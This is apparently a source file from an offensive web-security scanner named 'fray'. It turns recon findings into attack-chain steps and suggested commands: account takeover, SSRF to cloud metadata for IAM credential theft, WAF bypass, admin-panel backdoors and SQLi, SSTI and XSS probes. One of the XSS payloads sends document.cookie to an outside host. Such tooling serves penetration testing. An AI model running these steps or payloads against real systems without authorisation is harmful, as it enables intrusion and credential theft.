        login_url = ep.get("url", ep.get("path", "/login"))
        if not login_url.startswith("http"):
            login_url = f"{target.rstrip('/')}{login_url}"
        # Include known injectable params in the command if discovered
        known_params = ep.get("params", ep.get("parameters", []))
        param_str = ",".join(known_params[:5]) if known_params else "redirect,next,return"
        steps.append({
            "title": f"Account takeover via {_host(login_url)}",
            "detail": (
                f"Login endpoint: {login_url}. "
                "Test credential stuffing, 2FA bypass, password reset poisoning."
            ),
            "severity": "critical",
            "command": f"fray test {login_url} -c auth_bypass --smart --param {param_str}",
            "mitre": "T1078"
        })

    # SSRF → cloud metadata
    api_data = _rd.get("api_security", {})
    api_eps = (api_data.get("endpoints", []) if isinstance(api_data, dict) else [])
    cm_data = _rd.get("cloud_metadata", {})
    if isinstance(cm_data, dict) and cm_data.get("findings"):
        # Use the specific vulnerable URL from the finding, not just the base target
        cm_finding = cm_data["findings"][0]
        cm_url = cm_finding.get("url") or cm_finding.get("path") or target
        if cm_url and not cm_url.startswith("http"):
            cm_url = f"{target.rstrip('/')}{cm_url}"
        cm_param = cm_finding.get("param", "")
        cm_cmd = f"fray ssrf {cm_url}"
        if cm_param:
            cm_cmd += f" --param {cm_param}"
        steps.append({
            "title": "SSRF → Cloud metadata → IAM credential theft",
            "detail": (
                f"SSRF confirmed at {cm_url}. "
                "Fetch 169.254.169.254 → steal IAM role → full cloud account compromise."
            ),
            "severity": "critical",
            "command": cm_cmd,
            "mitre": "T1552.005"
        })
    elif api_eps and waf:
        api_ep0 = api_eps[0] if isinstance(api_eps[0], dict) else {}
        api_url = api_ep0.get("url") or api_ep0.get("path") or f"{target}/api"
        if api_url and not api_url.startswith("http"):
            api_url = f"{target.rstrip('/')}{api_url}"
        api_method = api_ep0.get("method", "GET")
        steps.append({
            "title": f"SSRF via API {api_method} {_host(api_url)}",
            "detail": (
                f"API endpoint: {api_url}. "
                "Test URL params for SSRF to reach cloud metadata / internal services."
            ),
            "severity": "high",
            "command": f"fray ssrf {api_url}",
            "mitre": "T1090"
        })

    # WAF bypass — use specific endpoint with highest value if known
    if waf and len(steps) < 3:
        # Find best target: login > api > payment > root
        waf_target = target
        for sig_kw, sig_data in [
            ("auth_endpoints", ("endpoints", 0, "url")),
            ("api_security",   ("endpoints", 0, "url")),
        ]:
            sig = _rd.get(sig_kw, {})
            if isinstance(sig, dict) and sig.get(sig_data[0]):
                ep = sig[sig_data[0]][sig_data[1]]
                ep_url = ep.get(sig_data[2], "") if isinstance(ep, dict) else str(ep)
                if ep_url:
                    waf_target = ep_url if ep_url.startswith("http") else f"{target.rstrip('/')}{ep_url}"
                    break
        steps.append({
            "title": f"Bypass {waf[:25]} WAF via encoding/Unicode evasion",
            "detail": f"WAF detected. Modern bypass techniques may allow payloads through on {_host(waf_target)}.",
            "severity": "medium",
            "command": f"fray modern {waf_target}",
            "mitre": "T1562.001"
        })

    # Privilege escalation / persistence step
    if len(steps) >= 2:
        admin_data = _rd.get("admin_panels", {})
        admin_list = (admin_data.get("panels_found", []) if isinstance(admin_data, dict) else [])
        if admin_list:
            ap = admin_list[0]
            ap_url = ap.get("url", ap.get("path", "/admin"))
            if not ap_url.startswith("http"):
                ap_url = f"{target.rstrip('/')}{ap_url}"
            ap_tech = ap.get("tech", "")
            steps.append({
                "title": f"Escalate → admin panel at {_host(ap_url)}",
                "detail": (
                    f"Admin panel: {ap_url}"
                    + (f" ({ap_tech})" if ap_tech else "")
                    + ". Post-exploitation: create backdoor account, extract data."
                ),
                "severity": "critical",
                "command": f"fray test {ap_url} -c xss --smart --max 200",
                "mitre": "T1078.003"
            })

    # Sort by severity: critical → high → medium → low
    # This ensures CRITICAL items always appear first in the chain
    _sev_order = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}
    steps.sort(key=lambda s: _sev_order.get(s.get("severity", "low"), 3))

    return steps[:6]


def _build_whats_next(
    target: str,
    recon_result: dict,
    test_results: list,
    waf: str,
    recs: list,
    risk: int,
) -> list:
    """Build context-aware What's Next recommendations from actual findings.

    Returns list of (command, description) tuples — max 6 entries.
    Priority order:
      1. Specific vulnerable URL found → test it directly
      2. Unprotected subdomain with critical path → test that subdomain
      3. LLM / AI endpoint found → test prompt injection
      4. Admin panel found → test directly
      5. Payment endpoint → test that endpoint
      6. Staging env found → test weaker controls
      7. WAF bypass found → agent/bypass that WAF
      8. High-risk category → deep test
      9. Hardening always last
    """
    hints: list = []
    seen_targets: set = set()
    seen_cats: set = set()

    _rd = recon_result or {}
    atk = _rd.get("attack_surface", {}) if isinstance(_rd, dict) else {}
    findings = atk.get("findings", []) if isinstance(atk, dict) else []
    vectors = atk.get("attack_vectors", []) if isinstance(atk, dict) else []
    cloud_dist = _rd.get("cloud_distribution", {}) if isinstance(_rd, dict) else {}
    per_sub = cloud_dist.get("per_subdomain", []) if isinstance(cloud_dist, dict) else []
    critical_paths = atk.get("critical_paths", []) if isinstance(atk, dict) else []

    # Extract specific injectable URLs from recon data for targeted commands
    _host = _rd.get("host", target.replace("https://", "").replace("http://", "").rstrip("/"))
    _scheme = "https"

    # Injectable parameters from parameter discovery
    _param_data = _rd.get("parameters", _rd.get("parameter_discovery", {}))
    _injectable = []
    if isinstance(_param_data, dict):
        for p_name, p_info in (_param_data.get("parameters", {}) or {}).items():
            if isinstance(p_info, dict) and p_info.get("injectable_params"):
                # Has injection signals — find any URL this param was found on
                srcs = p_info.get("sources", set())
                for src in (srcs if isinstance(srcs, (set, list)) else []):
                    if src.startswith("http"):
                        _injectable.append((src, p_name))
            elif isinstance(p_info, dict):
                # Include params from URL query string sources
                for src in (p_info.get("sources", []) or []):
                    if "?" in str(src) and p_name in str(src):
                        _injectable.append((str(src), p_name))
        # Also check injectable_params shortlist
        for p_name in (_param_data.get("injectable_params", []) or []):
            # Build URL using target + ?param=
            url_with_param = f"https://{_host}/?{p_name}=FUZZ"
            _injectable.append((url_with_param, p_name))

    # Auth/login endpoints from check_auth_endpoints
    _auth_ep = _rd.get("auth_endpoints", {})
    _auth_urls = []
    if isinstance(_auth_ep, dict):
        for ep in (_auth_ep.get("endpoints", []) or []):
            if isinstance(ep, dict):
                ep_url = ep.get("url", "")
                if not ep_url and ep.get("path"):
                    ep_url = f"{_scheme}://{_host}{ep['path']}"
                if ep_url:
                    _auth_urls.append((ep_url, ep.get("category", "login")))

    # Supply chain indicators
    _sc_data = _rd.get("supply_chain", {})
    _has_supply_chain = (isinstance(_sc_data, dict) and
                         _sc_data.get("risk_level") in ("critical", "high"))

    def _add(cmd: str, desc: str, cat: str = "") -> None:
        if len(hints) >= 6:
            return
        # Deduplicate by (command, cat) to prevent the same action appearing twice
        if any(h[0] == cmd for h in hints):
            return
        hints.append((cmd, desc))
        if cat:
            seen_cats.add(cat)

    def _target_key(url: str) -> str:
        """Normalise URL for dedup."""
        return url.rstrip('/').lower()

    # ── 0. Supply chain / Magecart (highest priority if detected) ────────
    if _has_supply_chain:
        sc_indicators = _sc_data.get("indicators", [])
        skimmer_found = _sc_data.get("skimmer_domains_found", [])
        sri_missing = _sc_data.get("sri_missing_on_payment", [])
        if skimmer_found:
            skimmer_host = skimmer_found[0].split("/")[2] if "/" in skimmer_found[0] else skimmer_found[0][:40]
            _add(f"fray scan {target} --deep --supply-chain",
                 f"CRITICAL: Magecart skimmer domain '{skimmer_host}' in page — confirm card data exfil", "supply_chain")
        elif sri_missing:
            # sri_missing entries are script src URLs (e.g. https://cdn.example.com/script.js)
            # We want to test the PAGE that loads these scripts, not the script files themselves.
            # Use the payment/checkout page URL as the test target.
            payment_paths = _sc_data.get("payment_paths", [])
            if payment_paths:
                checkout_url = (payment_paths[0] if payment_paths[0].startswith("http")
                                else f"{_scheme}://{_host}{payment_paths[0]}")
            else:
                # Fallback: use target's checkout or cart path — NOT the script src URL
                checkout_url = f"{_scheme}://{_host}/checkout"
            _add(f"fray test {checkout_url} -c csp_bypass --smart",
                 f"Payment page ({checkout_url}): {len(sri_missing)} script(s) without SRI — "
                 f"CSP bypass leads to skimming", "supply_chain")
        elif sc_indicators:
            _add(f"fray scan {target} --categories=csp_bypass,modern_bypasses",
                 f"Supply chain risk: {_sc_data.get('summary', 'audit 3rd-party scripts')}", "supply_chain")

    # ── 1. Actual vulnerabilities from Phase 2 testing ──────────────────
    if isinstance(test_results, list):
        for mr in test_results:
            if not isinstance(mr, dict):
                continue
            if not mr.get("vulnerable"):
                continue
            module = mr.get("module", "")
            mr_target = mr.get("target", target)
            bypasses = mr.get("bypasses", [])
            # Pick a specific vulnerable payload/category
            if "csp" in module:
                # Attack Chain uses `fray agent` (self-learning, deep).
                # What's Next uses `fray test --max 200` (enumerate all bypass paths first).
                # Different purpose: enumerate breadth vs confirm + exploit depth.
                _add(f"fray test {mr_target} -c csp_bypass --smart --max 200",
                     f"Enumerate all CSP bypass paths on {_short(mr_target)} (breadth-first before deep agent)")
                seen_cats.add("csp_bypass")
            elif "proto" in module or "pollution" in module:
                _add(f"fray test {mr_target} -c prototype_pollution --smart",
                     f"Prototype pollution on {_short(mr_target)} — escalate to RCE chain")
                seen_cats.add("prototype_pollution")
            elif "ssti" in module:
                _add(f"fray test {mr_target} -c ssti --level 2",
                     f"SSTI confirmed on {_short(mr_target)} — attempt RCE confirmation")
                seen_cats.add("ssti")
            elif bypasses:
                top_bypass = bypasses[0].get("payload", "") if bypasses else ""
                cat = (bypasses[0].get("family") or bypasses[0].get("type") or "xss").lower()
                _add(f"fray agent {mr_target} -c {cat} --rounds 10",
                     f"WAF bypasses found — self-learning agent to discover more")
                seen_cats.add("agent")

    # ── 2. LLM / AI endpoints ────────────────────────────────────────────
    llm_finding = next((f for f in findings if "llm" in f.get("type", "").lower()
                        or "ai" in f.get("type", "").lower()), None)
    if llm_finding and isinstance(llm_finding, dict):
        targets_list = llm_finding.get("targets", llm_finding.get("urls", []))
        llm_url = targets_list[0] if isinstance(targets_list, list) and targets_list else target
        if _target_key(llm_url) not in seen_targets:
            seen_targets.add(_target_key(llm_url))
            _add(f"fray test {llm_url} -c ai_prompt_injection --smart",
                 f"LLM/AI endpoint on {_short(llm_url)} — test prompt injection & jailbreak")
            _add(f"fray agent {llm_url} -c llm_testing --rounds 5 --ai",
                 f"AI agent: system prompt leak + indirect injection probes")

    # ── 3. Admin panels discovered ────────────────────────────────────────
    admin_data = (recon_result or {}).get("admin_panels", {}) if isinstance(recon_result, dict) else {}
    admin_panels = (admin_data.get("panels_found", []) or admin_data.get("found", [])
                    if isinstance(admin_data, dict) else [])
    if admin_panels and isinstance(admin_panels, list):
        ap = admin_panels[0]
        ap_path = ap.get("path", ap) if isinstance(ap, dict) else str(ap)
        ap_url = f"https://{(recon_result or {}).get('host', target.replace('https://',''))}{ap_path}" \
                 if not ap_path.startswith("http") else ap_path
        if _target_key(ap_url) not in seen_targets:
            seen_targets.add(_target_key(ap_url))
            _add(f"fray test {ap_url} -c xss --smart --max 200",
                 f"Admin panel {ap_path} — test XSS + injection in admin forms")
            _add(f"fray test {ap_url} -c sqli --smart",
                 f"Admin panel SQLi — admin DBs often have weaker WAF rules")

    # ── 4. Unprotected subdomain + critical path ──────────────────────────
    # Filter out infrastructure subdomains (nameservers, mail servers)
    # that are not HTTP web applications and not useful attack targets
    _INFRA_PREFIXES_2 = {
        "ns", "ns1", "ns2", "ns3", "ns4", "mx", "mx1", "mx2",
        "mail", "smtp", "pop", "imap", "ftp", "sftp",
        "dns", "ntp", "syslog",
    }
    unprotected = [s for s in per_sub
                   if isinstance(s, dict) and not s.get("waf") and not s.get("cdn")
                   and s.get("subdomain", "").split(".")[0].lower() not in _INFRA_PREFIXES_2]
    # Find unprotected subs that match critical path patterns
    _critical_kw = {"api", "auth", "login", "account", "admin", "pay", "checkout",
                    "staging", "dev", "llm", "chat", "gpt", "internal", "app", "portal",
                    "store", "shop", "web"}
    for sub in unprotected[:20]:
        sub_name = sub.get("subdomain", sub.get("host", ""))
        if any(kw in sub_name.lower() for kw in _critical_kw):
            sub_url = f"https://{sub_name}"
            if _target_key(sub_url) not in seen_targets:
                seen_targets.add(_target_key(sub_url))
                _add(f"fray test {sub_url} -c xss --smart --max 500",
                     f"No WAF on {sub_name} — payloads reach origin directly")
                _add(f"fray recon {sub_url} --deep",
                     f"Deep recon on exposed {sub_name}")
                break

    # ── 4b. Specific XSS targets: auth/login + injectable params ─────────
    # Login/signup pages — high-value XSS targets (pre-auth surface, no WAF bypass needed)
    for auth_url, auth_cat in _auth_urls[:3]:
        if _target_key(auth_url) not in seen_targets:
            seen_targets.add(_target_key(auth_url))
            if auth_cat in ("login", "signin", "auth"):
                xss_url = f"{auth_url}?redirect=javascript:alert(1)&next=<img/src=x/onerror=fetch('//fray.io/x?c='+document.cookie)>"
                _add(f"fray test {auth_url} -c xss --smart --param redirect,next,return",
                     f"Login endpoint {_short(auth_url)} — reflected XSS in redirect/next param pre-auth")
            elif auth_cat in ("signup", "register"):
                _add(f"fray test {auth_url} -c massassign --smart",
                     f"Registration endpoint {_short(auth_url)} — mass assignment: add role=admin to signup")
            break

    # Injectable parameters — build specific, URL-based probe commands
    _db_params = {"id", "user", "uid", "userid", "username", "name", "search", "q",
                  "query", "filter", "cat", "category", "sort", "order", "page",
                  "limit", "offset", "where", "from", "table", "column"}
    _url_params = {"url", "redirect", "return", "next", "dest", "uri", "path",
                   "target", "src", "source", "href", "link", "fetch", "proxy"}
    _tmpl_params = {"template", "page", "view", "layout", "theme", "skin",
                    "format", "render", "output", "type"}

    if _injectable:
        for inj_url, inj_param in _injectable[:4]:
            p_lower = inj_param.lower()
            base_url = inj_url.replace(f"?{inj_param}=FUZZ", "").replace(f"&{inj_param}=FUZZ", "")

            # XSS probe — include the actual URL with payload embedded
            if "xss" not in seen_cats and _target_key(base_url) not in seen_targets:
                xss_url = f"{base_url}?{inj_param}=<img/src/onerror=alert(document.domain)>" \
                    if "?" not in base_url else f"{base_url}&{inj_param}=<img/onerror=alert(1)>"
                _add(f"fray xss {base_url} --param {inj_param}",
                     f"Reflected XSS: {_short(base_url)}?{inj_param}= ({inj_param!r} found in crawl/Wayback)")
                seen_cats.add("xss")
                break

        for inj_url, inj_param in _injectable[:4]:
            p_lower = inj_param.lower()
            base_url = inj_url.replace(f"?{inj_param}=FUZZ", "").replace(f"&{inj_param}=FUZZ", "")

            # SQLi — DB lookup params
            if "sqli" not in seen_cats and p_lower in _db_params:
                _add(f"fray sqli {base_url} --param {inj_param}",
                     f"SQL injection: {_short(base_url)}?{inj_param}= — DB lookup param")
                seen_cats.add("sqli")
                break

            # SSRF — URL params
            if "ssrf" not in seen_cats and p_lower in _url_params:
                _add(f"fray ssrf {base_url} --param {inj_param}",
                     f"SSRF: {_short(base_url)}?{inj_param}= accepts URLs — test for 169.254.169.254")
                seen_cats.add("ssrf")
                break

            # SSTI — template/render params
            if "ssti" not in seen_cats and p_lower in _tmpl_params:
                _add(f"fray ssti {base_url} --param {inj_param}",
                     f"SSTI: {_short(base_url)}?{inj_param}= may render templates — test {{{{7*7}}}}")
                seen_cats.add("ssti")
                break

    # ── 5. Critical path endpoints ────────────────────────────────────────
    for cp in critical_paths[:3]:
        if not isinstance(cp, dict):
            continue
        cp_url = cp.get("url", "")
        cp_type = cp.get("type", "")
        cp_sev  = cp.get("severity", "")
        if not cp_url or _target_key(cp_url) in seen_targets:
            continue
        seen_targets.add(_target_key(cp_url))

        if "payment" in cp_type.lower() or "checkout" in cp_url.lower():
            _add(f"fray test {cp_url} -c massassign --smart",
                 f"Payment endpoint {_short(cp_url)} — test price/discount manipulation")
        elif "api" in cp_type.lower() or "/api" in cp_url:
            _add(f"fray test {cp_url} -c api_security --smart",
                 f"API endpoint — test BOLA, mass assignment, SSRF")
        elif "auth" in cp_url.lower() or "login" in cp_url.lower():
            _add(f"fray test {cp_url} -c sqli --smart",
                 f"Auth endpoint {_short(cp_url)} — SQLi + credential stuffing surface")
        elif cp_sev == "critical":
            cat = recs[0] if recs else "xss"
            _add(f"fray test {cp_url} -c {cat} --smart",
                 f"Critical path: {_short(cp_url)} — {cp_type}")

    # ── 6. Staging environments ───────────────────────────────────────────
    staging_envs = atk.get("staging_envs", []) if isinstance(atk, dict) else []
    if staging_envs and isinstance(staging_envs, list):
        stg = staging_envs[0]
        stg_url = f"https://{stg}" if not stg.startswith("http") else stg
        if _target_key(stg_url) not in seen_targets:
            seen_targets.add(_target_key(stg_url))
            _add(f"fray agent {stg_url} -c xss --rounds 5",
                 f"Staging env {_short(stg_url)} — weaker WAF rules, higher bypass rate")

    # ── 7. WAF bypass / deep test ─────────────────────────────────────────
    if waf and "agent" not in seen_cats and len(hints) < 5:
        top_cat = next((r for r in recs if r not in seen_cats), "xss")
        _add(f"fray agent {target} -c {top_cat} --rounds 5",
             f"Self-learning agent vs {waf[:24]} — discovers bypass patterns")
        seen_cats.add("agent")

    if waf and len(hints) < 5:
        _add(f"fray bypass {target} -c xss",
             f"AI WAF bypass — generate custom evasion payloads vs {waf[:24]}")

    # ── 8. Recommended categories not yet tested ──────────────────────────
    for cat in recs[:3]:
        if len(hints) >= 5:
            break
        cat_str = cat if isinstance(cat, str) else cat.get("category", "xss")
        if cat_str not in seen_cats:
            _add(f"fray test {target} -c {cat_str} --smart --max 200",
                 f"Deep test: {cat_str} (recommended by recon)")
            seen_cats.add(cat_str)

    # ── 9. Hardening — always include if risk >= 40 ───────────────────────
    if risk >= 40 and len(hints) < 6:
        _add(f"fray harden {target}",
             "Security headers + OWASP hardening audit")

    # ── 10. Deep recon fallback ───────────────────────────────────────────
    if len(hints) < 3:
        _add(f"fray recon {target} --deep",
             "Extended DNS, 300 subdomains, Wayback history")

    return hints[:6]


def _short(url: str, max_len: int = 40) -> str:
    """Short display form of URL — strip scheme, truncate."""
    s = url.replace("https://", "").replace("http://", "").rstrip("/")
    return s[:max_len - 1] + "…" if len(s) > max_len else s


class GuidedPipeline:
    """Zero-knowledge guided pipeline: recon → smart test → report.

    Usage:
        fray go https://target.com          # Full auto pipeline
        fray go https://target.com --deep   # Deep mode
        fray go https://target.com -o out/  # Custom output dir
    """

    def __init__(self, target: str, *, timeout: int = 8, deep: bool = False,
                 output_dir: str = "", headers: dict = None,
                 stealth: bool = False, quiet: bool = False,
                 impersonate: str = None, share: bool = False,
                 share_expires: int = 30, open_browser: bool = True):
        self.target = target
        self.timeout = timeout
        self.deep = deep
        self.output_dir = output_dir
        self.headers = headers
        self.stealth = stealth
        self.quiet = quiet
        self.impersonate = impersonate
        self.recon_result = None
        self.test_results = []
        self.report_path = ""
        self.share = share
        self.share_expires = share_expires
        self.share_url: Optional[str] = None
        self.share_meta: Optional[Dict[str, Any]] = None
        self.open_browser = open_browser  # auto-open HTML report when done

    def run(self) -> dict:
        """Execute the full guided pipeline. Returns summary dict."""
        from fray.ui import (S, banner, phase_header, summary_line, severity_summary,
                             cmd_hint, section_title, pill, severity_color)

        t0 = time.monotonic()
        out = sys.stderr
        summary = {"target": self.target, "phases": []}

        # ── Dashboard (optional live TUI) ──────────────────────────────
        _dash = None
        try:
            from fray.dashboard import Dashboard
            _dash = Dashboard(target=self.target, quiet=self.quiet)
        except Exception:
            pass

        # ── Banner ─────────────────────────────────────────────────────
        if not self.quiet:
            out.write(banner("Fray — Guided Security Pipeline", self.target))
            out.write(f"  {S.dim}[1/3]{S.reset} Recon       Tech stack, WAF, TLS, headers, DNS, responses, secrets, ports...\n")
            out.write(f"  {S.dim}[2/3]{S.reset} Test        Select & run payloads based on what recon found\n")
            out.write(f"  {S.dim}[3/3]{S.reset} Report      Generate findings report with remediation\n\n")
            out.flush()

        # ── Phase 1: Recon ─────────────────────────────────────────────
        if not self.quiet:
            out.write(phase_header(1, "Attack Surface Intelligence"))
            out.write(f"  {S.dim}Checking TLS, headers, DNS, CORS, subdomains, tech stack, WAF...{S.reset}\n")
        if _dash:
            _dash.set_phase(1, "Recon", total=50)
        self.recon_result = self._run_recon()
        if _dash:
            _dash.update_progress(done=50)

        if not self.recon_result:
            out.write(f"  {S.error}\u2716 Recon failed — cannot continue.{S.reset}\n")
            return summary

        if self.share:
            self._share_snapshot()
            if self.share and not self.share_url and not self.quiet:
                sys.stderr.write("  ⚠ Share requested but no public snapshot was created. Is R2 configured?\n")

        atk = self.recon_result.get("attack_surface", {})
        risk = atk.get("risk_score", 0)
        risk_level = atk.get("risk_level", "?")
        waf = atk.get("waf_vendor", "")
        findings = atk.get("findings", [])
        recs = self.recon_result.get("recommended_categories", [])

        summary["phases"].append({
            "name": "recon",
            "risk_score": risk,
            "risk_level": risk_level,
            "waf": waf,
            "findings": len(findings),
        })

        # Feed dashboard with recon results
        if _dash:
            _dash.set_risk(risk)
            _dash.update_stat("subdomains", len(self.recon_result.get("subdomains", {}).get("subdomains", [])))
            _dash.update_stat("vectors", len(atk.get("attack_vectors", [])))
            for f in findings[:20]:
                _dash.add_finding(f.get("title", f.get("type", ""))[:60],
                                  f.get("severity", "info"))

        if not self.quiet:
            # Severity summary
            sev_counts = {}
            for f in findings:
                s = f.get("severity", "info")
                sev_counts[s] = sev_counts.get(s, 0) + 1
            out.write(f"\n  {S.success}\u2714{S.reset} {S.bold}{S.white}Intelligence gathered{S.reset}\n\n")
            out.write(f"  {severity_summary(sev_counts)}\n")
            risk_c = S.critical if risk >= 70 else S.high if risk >= 40 else S.success
            out.write(summary_line("Risk", f"{risk}/100 ({risk_level})", "") + "\n")

            # WAF line — show multi-WAF summary when available
            cloud_dist = self.recon_result.get("cloud_distribution", {})
            waf_dist   = cloud_dist.get("waf_distribution", {}) if isinstance(cloud_dist, dict) else {}
            cdn_dist   = cloud_dist.get("cdn_distribution", {}) if isinstance(cloud_dist, dict) else {}
            waf_vendors = sorted(waf_dist.keys()) if isinstance(waf_dist, dict) else []
            cdn_vendors = sorted(cdn_dist.keys()) if isinstance(cdn_dist, dict) else []

            if waf_vendors and len(waf_vendors) > 1:
                # Multi-WAF environment
                waf_display = f"Multi-WAF: {', '.join(waf_vendors[:4])}"
                if len(waf_vendors) > 4:
                    waf_display += f" +{len(waf_vendors)-4} more"
                out.write(summary_line("WAF", waf_display, "accent") + "\n")
                # Show per-WAF subdomain counts
                for v, info in list(waf_dist.items())[:3]:
                    pct = info.get("pct", 0) if isinstance(info, dict) else 0
                    cnt = info.get("count", 0) if isinstance(info, dict) else 0
                    out.write(f"  {S.dark}  {'':20}{S.reset} {S.accent}↳ {v}: {cnt} subdomain(s) ({pct:.0f}%){S.reset}\n")
            elif waf:
                out.write(summary_line("WAF", waf, "accent") + "\n")

            if cdn_vendors and len(cdn_vendors) > 1:
                cdn_display = f"Multi-CDN: {', '.join(cdn_vendors[:4])}"
                if len(cdn_vendors) > 4:
                    cdn_display += f" +{len(cdn_vendors)-4} more"
                out.write(summary_line("CDN", cdn_display, "dim") + "\n")
            elif cloud_dist and isinstance(cloud_dist, dict):
                cdn_single = cloud_dist.get("cdn_vendor") or ""
                if cdn_single:
                    out.write(summary_line("CDN", cdn_single, "dim") + "\n")

            # Per-subdomain WAF coverage summary — show vendor names
            per_sub = cloud_dist.get("per_subdomain", []) if isinstance(cloud_dist, dict) else []
            if per_sub:
                protected = sum(1 for s in per_sub if isinstance(s, dict) and (s.get("waf") or s.get("cdn")))
                total_sub = len(per_sub)
                exposed   = total_sub - protected
                # Build vendor breakdown: "1 by Akamai, 1 by Cloudflare"
                from collections import Counter
                waf_counts: Counter = Counter()
                cdn_counts: Counter = Counter()
                for s in per_sub:
                    if not isinstance(s, dict): continue
                    if s.get("waf"):
                        waf_counts[s["waf"]] += 1
                    elif s.get("cdn"):
                        cdn_counts[s["cdn"]] += 1
                protection_parts = []
                for vendor, cnt in waf_counts.most_common(3):
                    protection_parts.append(f"{cnt} by {S.accent}{vendor}{S.reset} WAF")
                for vendor, cnt in cdn_counts.most_common(2):
                    protection_parts.append(f"{cnt} by {S.dim}{vendor}{S.reset} CDN")
                protection_str = (", ".join(protection_parts)
                                  if protection_parts else f"{S.success}{protected} protected{S.reset}")
                if exposed > 0:
                    out.write(summary_line("Subdomains",
                        f"{total_sub} total — "
                        f"{S.error}{exposed} exposed{S.reset} (no WAF/CDN), "
                        f"{protection_str}") + "\n")
                    # List exposed subdomains (skip infra ones already filtered)
                    _INFRA = {"ns","ns1","ns2","ns3","ns4","mx","mx1","mx2","mail","smtp","pop","imap","ftp","dns","ntp"}
                    exposed_subs = [
                        s for s in per_sub
                        if isinstance(s, dict)
                        and not s.get("waf") and not s.get("cdn")
                        and s.get("subdomain", "").split(".")[0].lower() not in _INFRA
                    ][:4]
                    if exposed_subs:
                        for s in exposed_subs:
                            sub_name = s.get("subdomain", "")
                            srv = s.get("server", "")
                            status = s.get("status", "")
                            extra = f" {S.dim}[{srv}]{S.reset}" if srv and srv != "-" else ""
                            out.write(f"  {S.dark}  {'':20}{S.reset} "
                                      f"{S.dim}↳ {sub_name}{extra}{S.reset}\n")
                else:
                    out.write(summary_line("Subdomains",
                        f"{total_sub} total — all protected ({protection_str})") + "\n")
            # ── Key findings inline display ───────────────────────────────────
            _rd_inline = self.recon_result or {}

            # 0. Risky ports — show which host + service/banner context
            ps_inline = _rd_inline.get("port_scan", {})
            if isinstance(ps_inline, dict):
                risky_inline = ps_inline.get("risky_ports", [])
                if risky_inline:
                    # Group by host
                    _host_ports: dict = {}
                    for p in risky_inline:
                        if not isinstance(p, dict): continue
                        ph = p.get("host", _rd_inline.get("host", "target"))
                        _host_ports.setdefault(ph, []).append(p)

                    port_lines = []
                    for ph, ports in list(_host_ports.items())[:4]:
                        # Short hostname display
                        ph_short = ph.split(".")[0] if "." in ph else ph
                        parts = []
                        for p in ports[:3]:
                            port_num = p.get("port", "?")
                            service  = p.get("service", "")
                            banner   = (p.get("banner") or "")[:20]
                            label = f"{port_num}/{service}" if service else str(port_num)
                            if banner:
                                label += f"[{banner}]"
                            parts.append(label)
                        port_lines.append(f"{S.target}{ph_short}{S.reset}: {', '.join(parts)}")

                    _RISKY_INFO = {
                        21: "FTP — cleartext credentials", 22: "SSH — brute-force target",
                        23: "Telnet — unencrypted", 25: "SMTP — mail relay",
                        445: "SMB — ransomware vector", 3306: "MySQL — direct DB access",
                        3389: "RDP — remote desktop", 5432: "PostgreSQL", 6379: "Redis",
                        9200: "Elasticsearch", 27017: "MongoDB", 5900: "VNC",
                    }
                    first_port = risky_inline[0].get("port") if isinstance(risky_inline[0], dict) else None
                    risk_note = _RISKY_INFO.get(first_port, "") if first_port else ""
                    risk_note_str = f"  {S.dim}({risk_note}){S.reset}" if risk_note else ""

                    out.write(summary_line("Risky Ports",
                        f"{S.error}{len(risky_inline)} port(s){S.reset}{risk_note_str} — "
                        + " | ".join(port_lines)) + "\n")

            # 1. Supply chain / Magecart
            sc_inline = _rd_inline.get("supply_chain", {})
            if isinstance(sc_inline, dict) and sc_inline.get("risk_level") in ("critical", "high"):
               out.write(summary_line("Supply Chain", f"{S.error}RISK{S.reset} — " + sc_inline.get("summary", ""), "") + "\n")

            # 2. Known CVEs
            fl_inline = _rd_inline.get("frontend_libs", {})
            if isinstance(fl_inline, dict):
                vulns = fl_inline.get("vulnerabilities", [])
                crit_vulns = [v for v in vulns if v.get("severity") in ("critical", "high")]
                if crit_vulns:
                    cve_str = ", ".join(v["id"] for v in crit_vulns[:3])
                    if len(crit_vulns) > 3:
                        cve_str += f" +{len(crit_vulns)-3}"
                    out.write(summary_line("Known CVEs", f"{S.error}{len(crit_vulns)} critical/high{S.reset}: {cve_str}", "") + "\n")
                elif vulns:
                    out.write(summary_line("Known CVEs", f"{len(vulns)} medium — {', '.join(v['id'] for v in vulns[:2])}", "dim") + "\n")

            # 3. Admin panels found
            admin_inline = _rd_inline.get("admin_panels", {})
            admin_list = (admin_inline.get("panels_found", []) or admin_inline.get("found", [])
                         if isinstance(admin_inline, dict) else [])
            if admin_list:
                open_panels = [a for a in admin_list if isinstance(a, dict) and a.get("protected") is False]
                ap_urls = [a.get("url", a.get("path", "")) for a in admin_list[:3] if isinstance(a, dict)]
                ap_str = ", ".join(u for u in ap_urls if u)[:60]
                flag = f"{S.error}EXPOSED{S.reset}" if open_panels else f"{S.warning}protected{S.reset}"
                out.write(summary_line("Admin Panels", f"{len(admin_list)} found {flag} — {ap_str}", "") + "\n")

            # 4. Auth endpoints
            auth_inline = _rd_inline.get("auth_endpoints", {})
            auth_eps = (auth_inline.get("endpoints", []) if isinstance(auth_inline, dict) else [])
            if auth_eps:
                auth_paths = [ep.get("url", ep.get("path", "")) for ep in auth_eps[:4] if isinstance(ep, dict)]
                out.write(summary_line("Auth Surface", f"{len(auth_eps)} endpoint(s): {', '.join(p for p in auth_paths[:3] if p)[:60]}", "accent") + "\n")

            # 5. Origin IP / WAF bypass
            origin_inline = _rd_inline.get("origin_ip", {})
            origin_cands = (origin_inline.get("candidates", []) if isinstance(origin_inline, dict) else [])
            if origin_cands:
                out.write(summary_line("Origin IPs", f"{S.warning}{len(origin_cands)} candidate(s){S.reset} — WAF bypassable via direct IP", "") + "\n")
                out.write(f"  {S.dark}  {'':20}{S.reset} {S.dim}↳ {', '.join(str(c.get('ip', c) if isinstance(c, dict) else c) for c in origin_cands[:3])}{S.reset}\n")

            # 6. API endpoints found
            api_inline = _rd_inline.get("api_security", {})
            api_eps = (api_inline.get("endpoints", api_inline.get("api_endpoints", [])) if isinstance(api_inline, dict) else [])
            if api_eps:
                api_paths = [ep.get("url", ep.get("path", "")) for ep in api_eps[:4] if isinstance(ep, dict)]
                out.write(summary_line("API Surface", f"{len(api_eps)} endpoint(s): {', '.join(p for p in api_paths[:3] if p)[:60]}", "accent") + "\n")

            # 7. Email security provider (from MX records)
            dns_inline = _rd_inline.get("dns", {})
            email_prov_inline = dns_inline.get("email_providers", []) if isinstance(dns_inline, dict) else []
            if email_prov_inline:
